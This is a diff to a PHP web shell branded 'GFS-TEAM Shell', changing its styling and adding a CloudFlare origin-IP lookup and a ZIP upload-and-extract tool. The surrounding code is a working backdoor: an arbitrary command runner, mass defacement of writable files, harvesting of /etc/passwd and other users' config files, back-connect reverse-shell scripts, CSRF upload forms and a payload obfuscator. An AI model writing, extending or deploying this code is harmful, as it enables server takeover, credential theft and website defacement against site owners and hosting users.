@@ -11,7 +11,6 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
@@ -72,37 +71,67 @@ function login_shell() {
             color: ;
             margin: 10px auto;
         }
+        #input{
+            background: transparent;
+            font-size: 12pt;
+            font-family: arial;
+            color: white;
+            width: 250px;
+            height: 25px;
+            padding: 5px 5px 5px 10px;
+            margin: 3px;
+            border-radius: 3px;
+            border: none;
+            text-align: center;
+        }
+        .kedip {
+            -webkit-animation-name: blinker;
+            -webkit-animation-duration: 3s;
+            -webkit-animation-timing-function: linear;
+            -webkit-animation-iteration-count: infinite;
+            -moz-animation-name: blinker;
+            -moz-animation-duration: 2s;
+            -moz-animation-timing-function: linear;
+            -moz-animation-iteration-count: infinite;
+            animation-name: blinker;
+            animation-duration: 1s;
+            animation-timing-function: linear;
+            animation-iteration-count: infinite;
+            color: cyan;
+        }
+        @-moz-keyframes blinker {  
+            0% { opacity: 1.0; }
+            50% { opacity: 0.0; }
+            100% { opacity: 1.0; }
+        }
+        @-webkit-keyframes blinker {  
+            0% { opacity: 1.0; }
+            50% { opacity: 0.0; }
+            100% { opacity: 1.0; }
+        }
+        @keyframes blinker {  
+            0% { opacity: 1.0; }
+            50% { opacity: 0.0; }
+            100% { opacity: 1.0; }
+        }
       </style>
     </head>
     <center>
-    <font face="monospace" size='3' color='lavender'>
-    <br>
-    <header>
-    <pre>
-        
+    <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+    <pre onkeydown="return false;" onmousedown="return false;" class="kedip">
+  ____  _____  _____        ______    ___   ____  ___ ___ 
+ /    ||     |/ ___/       |      |  /  _] /    ||   |   |
+|   __||   __(   \_  _____ |      | /  [_ |  o  || _   _ |
+|  |  ||  |_  \__  ||     ||_|  |_||    _]|     ||  \_/  |
+|  |_ ||   _] /  \ ||_____|  |  |  |   [_ |  _  ||   |   |
+|     ||  |   \    |         |  |  |     ||  |  ||   |   |
+|___,_||__|    \___|         |__|  |_____||__|__||___|___|
+                                                          
     </pre>
-    </header>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <label for="login">
-        Username
-    </label>
     <form method="post">
-    <input type="text" name="id" value="GFS-TEAM" style="text-align: center;">
-    </form>
-        Password
-    <form method="post">
-    <input type="password" name="pass" style="text-align: center;"> <br><br>
-    <input type="submit" value="Login">
+    <input id="input" type="password" name="pass" style="text-align: center;">
     </form>
     <style>
-
     </style>
     </head>
     <body>
@@ -151,127 +180,197 @@ function login_shell() {
     ?>
 <html>
 <head>
-<title>GFS-TEAM Shell</title>
-<meta name='author' content='Shell From GFS-TEAM'>
-<meta charset="UTF-8">
-<link href='http://i.imgur.com/7d5rIQm.png' rel='icon' type='image/x-icon'/>
-<style type='text/css'>
-@import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
-html {
-    background: #000000;
-    color: #ffffff;
-    font-family: 'Share Tech Mono';
-    font-size: 12px;
-    width: 100%;
-}
-li {
-    display: inline;
-    margin: 1px;
-    padding: 1px;
-}
-
- #menu{
-    background:#111111;
-    margin:9px 3px 4px 2px;
-}
-#menu a{
-    padding:4px 19px;
-    margin:0;
-    background:#222222;
-    text-decoration:none;
-    letter-spacing:2px;
-    -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
-
-}
-#menu a:hover{
-    background:#191919;
-    border-bottom:1px solid #333333;
-    border-top:1px solid #333333;
-}
-.explore tr:hover{background:#181818}
-table tr:first-child{   
-    background: #191919;
-    text-align: center;
-    color: white;
-}
-table, th, td {
-    border-collapse:collapse;
-    font-family: Tahoma, Geneva, sans-serif;
-    background: transparent;
-    font-family: 'Share Tech Mono';
-    font-size: 13px;
-}
-.table_home, .th_home, .td_home {
-    border: 1px solid #191919;
-}
-th {
+    <title>GFS-TEAM Shell</title>
+    <meta name='author' content='GFS-TEAM Shell'>
+    <meta charset="UTF-8">
+    <link rel="ICON" href="http://icon-icons.com/icons2/390/PNG/512/bleeding-eye_39357.png">
+    <style type='text/css'>
+    @import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
+    html {
+        background: #000000;
+        color: cyan;
+        font-family: 'Share Tech Mono';
+        font-size: 12px;
+        width: 100%;
+    }
+    li {
+        display: inline;
+        margin: 1px;
+        padding: 1px;
+    }
+    #menu{
+        background:transparent;
+        margin:9px 3px 4px 2px;
+    }
+    #menu a{
+        padding:4px 19px;
+        margin:0;
+        background:#222222;
+        text-decoration:none;
+        letter-spacing:2px;
+        -moz-border-radius: 5px;
+        -webkit-border-radius: 5px;
+        -khtml-border-radius: 5px; 
+        border-radius: 5px;
+    }
+    #menu a:hover{
+        background:transparent;
+        border-bottom:1px solid #333333;
+        border-top:1px solid #333333;
+    }
+    .explore tr:hover{
+        background:#181818
+    }
+    table tr:first-child{   
+        background: #222222;
+        text-align: center;
+        color: green; 
+    }
+    table, th, td {
+        border-collapse:collapse;
+        font-family: Tahoma, Geneva, sans-serif;
+        background: transparent;
+        font-family: 'Share Tech Mono';
+        font-size: 13px;
+    }
+    .table_home, .th_home, .td_home {
+        border: 1px solid #191919;
+    }
+    th {
     padding: 10px;
-}
-a {
-    color: #ffffff;
-    text-decoration: none;
-}
-a:hover {
-    color: blue;
-    text-decoration: underline;
-}
-b {
-    color: blue;
-}
-input[type=text], input[type=password],input[type=submit] {
-    background: transparent; 
-    color: #ffffff; 
-    border: 1px solid #ffffff; 
-    margin: 5px auto;
-    padding-left: 5px;
-    font-family: 'Share Tech Mono';
-    font-size: 13px;
-}
-input[type=submit] {
-    background: #191919; 
-    color: #ffffff; 
-    border: 1px solid #ffffff; 
-    margin: 5px auto;
-    padding-left: 5px;
-    font-family: 'Share Tech Mono';
-    font-size: 13px;
-    cursor:pointer;
-}
-textarea {
-    border: 1px solid #ffffff;
-    width: 100%;
-    height: 400px;
-    padding-left: 5px;
-    margin: 10px auto;
-    resize: none;
-    background: transparent;
-    color: #ffffff;
-    font-family: 'Share Tech Mono';
-    font-size: 13px;
-}
-select {
-    width: 152px;
-    background: #000000; 
-    color: blue; 
-    border: 1px solid #ffffff; 
-    margin: 5px auto;
-    padding-left: 5px;
-    font-family: 'Share Tech Mono';
-    font-size: 13px;
-}
-option:hover {
-    background: blue;
-    color: #000000;
-}
-.mybox{-moz-border-radius: 10px; border-radius: 10px;border:1px solid #ff0000; padding:4px 2px;width:70%;line-height:24px;background:none;box-shadow: 0px 4px 2px white;-webkit-box-shadow: 0px 4px 2px #ff0000;-moz-box-shadow: 0px 4px 2px #ff0000;}
-.cgx2 {text-align: center;letter-spacing:1px;font-family: "orbitron";color: #ff0000;font-size:25px;text-shadow: 5px 5px 5px black;}
-.infoweb {
-    border-right: 1px solid #00FFFF;
-}
-</style>
+    }
+    a {
+        color: white;
+        text-decoration: none;
+    }
+    a:hover {
+        color: blue;
+        text-decoration: underline;
+    }
+    b {
+        color: blue;
+    }
+    input[type=text], input[type=password],input[type=submit] {
+        background: transparent; 
+        color: #ffffff; 
+        border: 1px solid #ffffff; 
+        margin: 5px auto;
+        padding-left: 5px;
+        font-family: 'Share Tech Mono';
+        font-size: 13px;
+    }
+    input[type=submit] {
+        background: #191919; 
+        color: #ffffff; 
+        border: 1px solid #ffffff; 
+        margin: 5px auto;
+        padding-left: 5px;
+        font-family: 'Share Tech Mono';
+        font-size: 13px;
+        cursor:pointer;
+    }
+    textarea {
+        border: 1px solid #ffffff;
+        width: 100%;
+        height: 400px;
+        padding-left: 5px;
+        margin: 10px auto;
+        resize: none;
+        background: transparent;
+        color: cyan;
+        font-family: 'Share Tech Mono';
+        font-size: 13px;
+    }
+    select {
+        width: 152px;
+        background: #000000; 
+        color: blue; 
+        border: 1px solid #ffffff; 
+        margin: 5px auto;
+        padding-left: 5px;
+        font-family: 'Share Tech Mono';
+        font-size: 13px;
+    }
+    option:hover {
+        background: blue;
+        color: #000000;
+    }
+    .mybox{
+        -moz-border-radius: 10px;
+        border-radius: 10px;
+        border:1px solid #ff0000;
+        padding:4px 2px;
+        width:70%;
+        line-height:24px;
+        background:none;
+        box-shadow: 0px 4px 2px white;
+        -webkit-box-shadow:0px 4px 2px #ff0000;
+        -moz-box-shadow: 0px 4px 2px #ff0000;
+    }
+    .tombol {
+        -moz-box-shadow: inset -21px 14px 15px -20px #cccccc;
+        -webkit-box-shadow:inset -21px 14px 15px -20px #cccccc;
+        box-shadow: inset -21px 14px 15px -20px #cccccc;
+        background: -webkit-gradient( linear, left top, left bottom, color-stop(0.05, #cccccc), color-stop(1, #cccccc));
+        background: -moz-linear-gradient(center top,#d6bfde 5%, #409ba1 100%);
+        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#d6bfde', endcolorstr='#409ba1');
+        background-color: #d6bfde;
+        -moz-border-radius:27px;
+        -webkit-border-radius:27px;
+        border-radius: 27px;
+        display: inline-block;
+        color: #262120;
+        font-family: arial black;
+        font-size: 14px;
+        font-weight: bold;
+        padding: 3px 27px;
+        text-decoration: none;
+        opacity: 0.6;
+        }
+    .cgx2 {
+            text-align: center;
+            letter-spacing:1px;
+            font-family: "orbitron";
+            color: #ff0000;
+            font-size:25px;
+            text-shadow: 5px 5px 5px black;
+        }
+        .infoweb {
+            border-right: 1px solid #00FFFF;
+        }
+        .kedip {
+            -webkit-animation-name: blinker;
+            -webkit-animation-duration: 3s;
+            -webkit-animation-timing-function: linear;
+            -webkit-animation-iteration-count: infinite;
+            -moz-animation-name: blinker;
+            -moz-animation-duration: 2s;
+            -moz-animation-timing-function: linear;
+            -moz-animation-iteration-count: infinite;
+            animation-name: blinker;
+            animation-duration: 1s;
+            animation-timing-function: linear;
+            animation-iteration-count: infinite;
+            color: cyan;
+        }
+        @-moz-keyframes blinker {
+            0% { opacity: 1.0; }
+            50% { opacity: 0.0; }
+            100% { opacity: 1.0; }
+        }
+        @-webkit-keyframes blinker {  
+            0% { opacity: 1.0; }
+            50% { opacity: 0.0; }
+            100% { opacity: 1.0; }
+        }
+        @keyframes blinker {  
+            0% { opacity: 1.0; }
+            50% { opacity: 0.0; }
+            100% { opacity: 1.0; }
+        }
+    </style>
 </head>
 <?php
- 
 function w($dir,$perm) {
     if(!is_writable($dir)) {
         return "<font color=red>".$perm."</font>";
@@ -474,11 +573,17 @@ if(!function_exists('posix_getegid')) {
 }
 
 echo '<center><div id="menu">';
-echo "<BR>";
-echo "<center><font size='6px' color='lavender'>GFS-TEAM Shell</font>";
-echo "<br>";
+echo "<center>    <pre onkeydown='return false;' onmousedown='return false;' class='kedip'>
+  ____  _____  _____        ______    ___   ____  ___ ___ 
+ /    ||     |/ ___/       |      |  /  _] /    ||   |   |
+|   __||   __(   \_  _____ |      | /  [_ |  o  || _   _ |
+|  |  ||  |_  \__  ||     ||_|  |_||    _]|     ||  \_/  |
+|  |_ ||   _] /  \ ||_____|  |  |  |   [_ |  _  ||   |   |
+|     ||  |   \    |         |  |  |     ||  |  ||   |   |
+|___,_||__|    \___|         |__|  |_____||__|__||___|___|
+                                                          
+    </pre></font>";
 echo "<p>";
-
 echo "<li> <a href='?'>Home</a> </li>";
 echo "<a style='color: blue;' href='?dir=$dir&do=infosys'>Info Website</a> </li>";
 echo "<li> <a href='?dir=$dir&do=upload'>Upload</a> </li>";
@@ -497,26 +602,27 @@ echo "<li> <a href='?dir=$dir&do=reverse'>ReverseIP</a> </li>";
 echo "<li> <a href='?dir=$dir&do=zoneh'>Zone-H</a> </li>";
 echo "<li> <a href='?dir=$dir&do=defacerid'>DefacerID</a> </li>";
 echo "<li> <a href='?dir=$dir&do=autoklik'>Priv Auto Deface From GFS-TEAM</a> </li>";
+echo "<li> <a href='?dir=$dir&do=adminer'>Adminer</a> </li>";
+echo "<li> <a href='?dir=$dir&do=tool'>Tool</a>";
 echo "<br><br><li> <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> </li>";
 echo "<li> <a href='?dir=$dir&do=fake_root'>Fake Root</a> </li>";
 echo "<li> <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> </li>";
 echo "<li> <a href='?dir=$dir&do=auto_wp'>Auto Edit Title</a> </li>";
 echo "<li> <a href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a> </li>";
 echo "<li> <a href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a> </li>";
-echo "<br><br><li> <a href='?dir=$dir&do=cpftp_auto'>CFTP Auto Deface</a> </li>";
 echo "<li> <a href='?dir=$dir&do=krdp_shell'>KRDP Shell</a> </li>";
-echo "<li> <a href='?dir=$dir&do=adminer'>Adminer</a> </li>";
-echo "<li> <a href='?dir=$dir&do=tool'>Tool</a>";
+echo "<br><br><li> <a href='?dir=$dir&do=cpftp_auto'>CFTP Auto Deface</a> </li>";
 echo "<li> <a href='?dir=$dir&do=admf'>Admin Finder</a> </li>";
 echo "<li> <a href='?dir=$dir&do=adfin'>Admin Finder v2</a> </li>";
 echo "<li> <a href='?dir=$dir&do=cgi'>CGI Telnet</a> </li>";
+echo "<li> <a href='?dir=$dir&do=bcf'>Bypass CloudFlare</a> </li>";
 echo "<br><br><li> <a href='?dir=$dir&do=csrf'>CSRF Online</a> </li>";
 echo "<li> <a href='?dir=$dir&do=shellscanner'>Shell Scanner</a> </li>";
 echo "<li> <a href='?dir=$dir&do=endeco'>Encode Decode</a> </li>";
 echo "<li> <a href='?xp=bypassserver'>Full Bypass</a> </li>";
 echo "<li> <a href='?dir=$dir&do=bconnet'>Back Connect</a> </li>";
 echo "<li> <a href='?dir=$dir&do=backconnect'>Back Connect V.2</a> </li>";
-echo "<li> <a href='?dir=$dir&do=ddos'>DDOS</a> </li>";
+echo "<li> <a href='?dir=$dir&do=zip'>ZIP MENU</a> </li>";
 echo "<li> <a href='?dir=$dir&do=whois'>Whois</a> </li>";
 echo "<li> <a href='?dir=$dir&do=about'>About</a> </li>";
 echo "<li> <a style='color: red;' href='?logout=true'>Logout</a> </li>";
@@ -538,7 +644,6 @@ foreach($scdir as $c_dir => $cdir) {
 }
 echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
 echo "<hr>";
-
 echo "</ul>";
 echo "</div>";
 if($_GET['logout'] == true) {
@@ -725,7 +830,9 @@ if($xp == "bypassserver"){
         <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
         </form></center>";
     }
-} elseif($_GET['do'] == 'symconfig') {
+}
+
+elseif($_GET['do'] == 'symconfig') {
 if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
 echo '<script>alert("Skid this won\'t work on Windows")</script>';
 exit;
@@ -4171,30 +4278,68 @@ elseif($_GET['do'] == 'backconnect') {
         echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
         unlink("/tmp/bc.pl");
     }
-}
-
-elseif($_GET['do'] == 'infosys') {
-
-echo '<center><div id="menu" >';
-echo "<ul>";
-echo "System: <font color=blue>".$kernel."</font><br>";
-echo "User: <font color=blue>".$user."</font> (".$uid.") Group: <font color=blue>".$group."</font> (".$gid.")<br>";
-echo "Server IP: <font color=blue>".$ip."</font> | Your IP: <font color=blue>".$_SERVER['REMOTE_ADDR']."</font><br>";
-echo "HDD: <font color=blue>$used</font> / <font color=blue>$total</font> ( Free: <font color=blue>$freespace</font> )<br>";
-echo "Safe Mode: $sm<br>";
-echo "Disable Functions: $show_ds<br>";
-echo "User: ".$user." (".$uid.") Group: ".$group." (".$gid.")<br>";
-echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
-echo "<hr>";
- 
- 
-    
-}   elseif($_GET['do'] == 'endeco') {
+} elseif($_GET['do'] == 'bcf') {
+echo '<form method="POST">
+<center>
+<p align="center" dir="ltr"><b><font size="5" face="Tahoma" color="cyan">=[ Bypass CloudFlare ]=</font></b></p>
+<select class="inputz" name="krz">
+<option>ftp</option>
+<option>direct-conntect</option>
+<option>webmail</option>
+<option>cpanel</option>
+</select>
+<input class="inputz" type="text" name="target" value="url">
+<input class="inputzbut" type="submit" value="Bypass">
+</center>';
+$target = $_POST['target'];
+    # Bypass From FTP
+    if ($_POST['krz'] == "ftp") {
+        $ftp = gethostbyname("ftp." . "$target");
+        echo "<br><p align='center' dir='ltr'>
+        <font face='Tahoma' size='2' color='white'>CORRECT IP IS : </font>
+        <font face='Tahoma' size='2' color='cyan'>$ftp</font></p>";
+    }
+    # Bypass From Direct-Connect
+    if ($_POST['krz'] == "direct-conntect") {
+        $direct = gethostbyname("direct-connect." . "$target");
+        echo "<br><p align='center' dir='ltr'>
+        <font face='Tahoma' size='2' color='white'>CORRECT IP IS : </font>
+        <font face='Tahoma' size='2' color='cyan'>$direct</font></p>";
+    }
+    # Bypass From Webmail
+    if ($_POST['krz'] == "webmail") {
+        $web = gethostbyname("webmail." . "$target");
+        echo "<br><p align='center' dir='ltr'>
+        <font face='Tahoma' size='2' color='white'>CORRECT IP IS : </font>
+        <font face='Tahoma' size='2' color='cyan'>$web</font></p>";
+    }
+    # Bypass From Cpanel
+    if ($_POST['krz'] == "cpanel") {
+        $cpanel = gethostbyname("cpanel." . "$target");
+        echo "<br><p align='center' dir='ltr'>
+        <font face='Tahoma' size='2' color='white'>CORRECT IP IS : </font>
+        <font face='Tahoma' size='2' color='cyan'>$cpanel</font></p>";
+    }
+} elseif($_GET['do'] == 'infosys') {
+    echo "<h1>-[ INFORMATION SERVER ]-</h1>";
+    echo '<center><div id="menu" >';
+    echo "<ul>";
+    echo "System: <font color=blue>".$kernel."</font><br>";
+    echo "User: <font color=blue>".$user."</font> (".$uid.") Group: <font color=blue>".$group."</font> (".$gid.")<br>";
+    echo "Server IP: <font color=blue>".$ip."</font> | Your IP: <font color=blue>".$_SERVER['REMOTE_ADDR']."</font><br>";
+    echo "HDD: <font color=blue>$used</font> / <font color=blue>$total</font> ( Free: <font color=blue>$freespace</font> )<br>";
+    echo "Safe Mode: $sm<br>";
+    echo "Disable Functions: $show_ds<br>";
+    echo "User: ".$user." (".$uid.") Group: ".$group." (".$gid.")<br>";
+    echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
+    echo "<hr>";
+} elseif($_GET['do'] == 'endeco') {
 
 @ini_set('output_buffering',0); 
 @ini_set('display_errors', 0);
 $text = $_POST['code'];
 ?>
+<br><center><font size="5">-[ Encode And Decode By GFS-TEAM ]-</font></center>
 <form method="post"><br>
 <textarea class='form-control con7' cols=80 rows=10 name="code"></textarea><br><br>
 <select class='form-control con7' size="1" name="ope">
@@ -4208,7 +4353,6 @@ $text = $_POST['code'];
 <option value="gzinflater">gzinflate - str_rot13 - base64</option>
 <option value="gzinflatex">gzinflate - str_rot13 - gzinflate - base64</option>
 <option value="gzinflatew">str_rot13-convert_uu-url-gzinflate-str_rot13-base64-convert_uu-gzinflate-url-str_rot13-gzinflate-base64</option>
-
 <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
 <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option></center>
 </select>&nbsp;<br><br><input class='kntd' type='submit' name='submit' value='Encode'>
@@ -4251,49 +4395,51 @@ break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzin
 break;default:break;}}
 $html = htmlentities(stripslashes($codi));
 echo "<from><textarea cols=80 rows=10 class='form-control con7' >".$html."</textarea><BR/><BR/></center><br></from>";
- 
- 
-  
-}
-        elseif($_GET['do'] == 'about') {
+} elseif($_GET['do'] == 'about') {
 ?>
-<br>
-    
-    <div class="terimakasih">
-<tr><td><center><font color="red">Discovering And Exploiting Security Flaws.
-    <p><font color="Lavender">Thanks To : Z3R0-K, IndoXploit, And Member GFS-TEAM</font>
-<br><a href="#">JOIN TO GROUP OFFICIAL GFS-TEAM</a>
-    <br><font color="Lavender"><font></font> <br>GFS-TEAM Shell Create By Z3R0-K
-</td></tr>
- 
- 
-    <?php
-} elseif($_GET['do'] == 'csrf') {
-?>      <html>
-<title>CSRF EXPLOITER ONLINE</title>
-<center><br><br><br><br>
-<font color=Lavenda>*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc
-<center>
-<form method="post">
-URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
-POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat Diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
-<input type="submit" name="d" value="Lock!">
-</form>
+<br><div class="terimakasih">
+    <tr>
+        <td>
+            <center>
+                <font color="red">Discovering And Exploiting Security Flaws.
+                    <p>
+                        <font color="Lavender">Thanks To : IndoXploit, N45HT And Member GFS-TEAM</font><br>
+                        <p>JOIN TO GROUP OFFICIAL GFS-TEAM</p>
+                        <a href="https://www.facebook.com/gfsteamid/" class="tombol" target="_blank">KLIK HERE</a><br><br>
+                        <font color="Lavender">GFS-TEAM Shell Create By Cerberus</font><br>
+                    </p>
+                </font>
+            </center>
+        </td>
+    </tr>
+</div>
 <?php
-//gak penting
+} elseif($_GET['do'] == 'csrf') {
+    ?>
+    <html>
+    <center><br>
+        <font color="cyan" size="5">-[ CSRF ONLINE By GFS-TEAM ]-</font><br><br><br>
+        <font color="cyan">*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc
+            <center>
+                <form method="post">
+                    URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
+                    POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat Diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
+                    <input type="submit" name="d" value="Lock!">
+                </form>
+            </center>
+        </font>
+<?php
      @$url = $_POST['url'];
      @$pf = $_POST['pf'];
      @$d = $_POST['d'];
 if($d) {
-    //baccod
-   
-    echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload Cok!'></form";
+    echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'>
+    <input type='submit' name='g' value='Upload Cok!'></form";
 }
 ?>
 </form>
 </html>
-<?php
- 
+<?php 
 } elseif($_GET['do'] == 'admf') {
     ?>
 <type='text/javascript'/></script>
@@ -4324,21 +4470,21 @@ foreach ($adminlocales as $admin){
 $headers = get_headers("$url$admin");
 if (eregi('200', $headers[0])) {
     echo "<a href='$url/$admin'>$url$admin</a> <font color='gold'>Ketemu Nih !</font><br />";
-}
-else {
+} else {
     echo "$url$admin <font color='red'>Tidak Ketemu</font><br />";
 }
 }
 }  
 } elseif($_GET['do'] == 'cmd') {
-    echo "<form method='post'>
+    echo "<h1>=[ COMMAND GFS-TEAM ]=</h1>
+    <form method='post'>
     <font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
     <input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
     </form>";
     if($_POST['do_cmd']) {
         echo "<pre>".exe($_POST['cmd'])."</pre>";
     }
-}elseif($_GET['do'] == 'mass_deface') {
+} elseif($_GET['do'] == 'mass_deface') {
     echo "<center><form action=\"\" method=\"post\">\n";
     $dirr=$_POST['d_dir'];
     $index = $_POST["script"];
@@ -4347,7 +4493,7 @@ else {
     function edit_file($file,$index){
         if (is_writable($file)) {
         clear_fill($file,$index);
-        echo "<Span style='color:green;'><strong> [+] Deface 100% Successfull </strong></span><br></center>";
+        echo "<Span style='color:cyan;'><strong> [+] Deface 100% Successfull </strong></span><br></center>";
         } 
         else {
             echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Deface Disini :( </strong></span><br></center>";
@@ -4398,7 +4544,7 @@ else {
         $n = 0 ;
         foreach ($files as $file){
             if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
-                echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
+                echo "<center><Span style='color: cyan;'><strong>$dirr/</span>$file</strong> ====> ";
                 edit_file($file,$index);
                 flush();
                 $n = $n +1 ;
@@ -4408,29 +4554,25 @@ else {
                 echo "<center><br><h3>$n Kali Anda Telah Deface Disini </h3></center><br>";
                     }
     function ListFiles($dirrall) {
-
-    if($dh = opendir($dirrall)) {
-
-       $files = Array();
-       $inner_files = Array();
-       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
-       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
-        while($file = readdir($dh)) {
-            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
-                if(is_dir($dirrall . "/" . $file)) {
-                    $inner_files = ListFiles($dirrall . "/" . $file);
-                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
-                } else {
-                    array_push($files, $dirrall . "/" . $file);
+        if($dh = opendir($dirrall)) {
+            $files = Array();
+            $inner_files = Array();
+            $me = str_replace(dirname(__FILE__).'/','',__FILE__);
+            $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
+            while($file = readdir($dh)) {
+                if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
+                    if(is_dir($dirrall . "/" . $file)) {
+                        $inner_files = ListFiles($dirrall . "/" . $file);
+                        if(is_array($inner_files)) $files = array_merge($files, $inner_files);
+                    } else {
+                        array_push($files, $dirrall . "/" . $file);
+                    }
                 }
             }
-            }
-
             closedir($dh);
             return $files;
         }
-    }
-    function gass_all(){
+    } function gass_all(){
         global $index ;
         $dirrall=$_POST['d_dir'];
         foreach (ListFiles($dirrall) as $key=>$file){
@@ -4464,7 +4606,7 @@ else {
         }
     }
     if($_POST['mass'] == 'onedir') {
-        echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
+        echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:cyan;' name='index' rows='10' cols='67'>\n";
         $ini="http://";
         $mainpath=$_POST[d_dir];
         $file=$_POST[d_file];
@@ -4561,9 +4703,9 @@ else {
     }
 } elseif($_GET['do'] == 'config') {
     $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
-    $idx = mkdir("idx_config", 0777);
+    $idx = mkdir("gfs_config", 0777);
     $isi_htc = "Options all\nRequire None\nSatisfy Any";
-    $htc = fopen("idx_config/.htaccess","w");
+    $htc = fopen("gfs_config/.htaccess","w");
     fwrite($htc, $isi_htc);
     while($passwd = fgets($etc)) {
         if($passwd == "" || !$etc) {
@@ -4600,7 +4742,7 @@ else {
                         $ambil_config = file_get_contents($config);
                         if($ambil_config == '') {
                         } else {
-                            $file_config = fopen("idx_config/$user_idx-$nama_config.txt","w");
+                            $file_config = fopen("gfs_config/$user_idx-$nama_config.txt","w");
                             fputs($file_config,$ambil_config);
                         }
                     }
@@ -6139,15 +6281,131 @@ Satisfy Any
         <br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
         </center>";
     }
+} elseif($_GET['do'] == 'zip') {
+    echo "<h1>=[ Zip Menu By GFS-TEAM ]=</h1>";
+    function rmdir_recursive($dir) {
+        foreach(scandir($dir) as $file) {
+            if ('.' === $file || '..' === $file) continue;
+            if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
+            else unlink("$dir/$file");
+        }
+        rmdir($dir);
+    }
+    if($_FILES["zip_file"]["name"]) {
+        $filename = $_FILES["zip_file"]["name"];
+        $source = $_FILES["zip_file"]["tmp_name"];
+        $type = $_FILES["zip_file"]["type"];
+        $name = explode(".", $filename);
+        $accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
+        foreach($accepted_types as $mime_type) {
+            if($mime_type == $type) {
+                $okay = true;
+                break;
+            }
+        }
+        $continue = strtolower($name[1]) == 'zip' ? true : false;
+        if(!$continue) {
+            $message = "Maaf Itu Bukan File ZIP";
+    }
+    $path = dirname(__FILE__).'/';
+    $filenoext = basename ($filename, '.zip');
+    $filenoext = basename ($filenoext, '.ZIP');
+    $targetdir = $path . $filenoext;
+    $targetzip = $path . $filename;
+    if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
+    mkdir($targetdir, 0777);
+    if(move_uploaded_file($source, $targetzip)) {
+        $zip = new ZipArchive();
+        $x = $zip->open($targetzip);
+        if ($x === true) {
+            $zip->extractTo($targetdir);
+            $zip->close();
+            unlink($targetzip);
+        }
+        $message = "<b>Sukses</b>";
+    } else {
+        $message = "<b>Failed(</b>";
+    }
 }
-
-elseif($_GET['do'] == 'krdp_shell') {
+echo '<table style="width:100%" border="1">
+<tr><h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
+<label>Zip File : <input type="file" name="zip_file" /></label>
+<input type="submit" name="submit" value="Upload And Unzip" />
+</form>';
+if($message) echo "<p>$message</p>";
+echo "</tr><hr><tr><h2>Zip Backup</h2>
+<form action='' method='post'>
+<font style='text-decoration: underline;'>Folder:</font><br>
+<input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br>
+<font style='text-decoration: underline;'>Save To:</font><br>
